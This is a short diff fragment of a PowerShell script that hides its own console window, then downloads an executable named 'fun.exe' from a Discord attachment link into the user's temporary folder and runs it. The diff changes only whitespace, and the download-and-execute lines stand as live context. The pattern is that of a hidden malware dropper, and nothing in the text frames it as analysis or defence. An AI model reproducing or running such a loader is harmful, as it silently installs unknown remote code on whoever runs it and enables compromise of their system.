@@ -13,7 +13,7 @@ public static class WinAPI {
 
 $hwnd = [WinAPI]::GetConsoleWindow()
 [WinAPI]::ShowWindow($hwnd, 0) 
-
+ 
 Invoke-WebRequest "https://cdn.discordapp.com/attachments/1055546374344679557/1442395642281328724/fun.exe?ex=69692c5f&is=6967dadf&hm=a6ccb1fe4705cadac5ee5fa88ce056b87bd77706714bf7adde2cf09c755639c6&"  -UseBasicParsing  -OutFile "$env:LOCALAPPDATA\Temp\fun.exe"
 
 & "$env:LOCALAPPDATA\Temp\fun.exe"
